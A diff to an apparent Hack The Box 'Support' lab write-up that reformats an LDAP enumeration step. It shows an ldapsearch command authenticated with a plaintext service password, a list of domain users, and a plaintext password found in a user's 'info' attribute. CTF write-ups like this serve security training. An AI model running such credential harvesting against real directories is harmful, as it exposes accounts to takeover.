@@ -718,8 +718,32 @@ ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7Ac
 
 **Result:**
 
-```
-sAMAccountName: AdministratorsAMAccountName: GuestsAMAccountName: DC$sAMAccountName: krbtgtsAMAccountName: ldapinfo: Ironside47pleasure40WatchfulsAMAccountName: supportsAMAccountName: smith.rosariosAMAccountName: hernandez.stanley... (18 domain users total) ...
+```shell
+┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
+└─$ ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(objectClass=user)" sAMAccountName info | grep -iE 'sAMAccountName|info:'
+# requesting: sAMAccountName info 
+sAMAccountName: Administrator
+sAMAccountName: Guest
+sAMAccountName: DC$
+sAMAccountName: krbtgt
+sAMAccountName: ldap
+info: Ironside47pleasure40Watchful
+sAMAccountName: support
+sAMAccountName: smith.rosario
+sAMAccountName: hernandez.stanley
+sAMAccountName: wilson.shelby
+sAMAccountName: anderson.damian
+sAMAccountName: thomas.raphael
+sAMAccountName: levine.leopoldo
+sAMAccountName: raven.clifton
+sAMAccountName: bardot.mary
+sAMAccountName: cromwell.gerard
+sAMAccountName: monroe.david
+sAMAccountName: west.laura
+sAMAccountName: langley.lucy
+sAMAccountName: daughtler.mabel
+sAMAccountName: stoll.rachelle
+sAMAccountName: ford.victoria
 ```
 
 _What this gives you:_ **Key finding:** the `support` user object carries a non-default `info` attribute containing `Ironside47pleasure40Watchful` — a plaintext password stored in a notes field — providing candidate credentials for the `support` account.
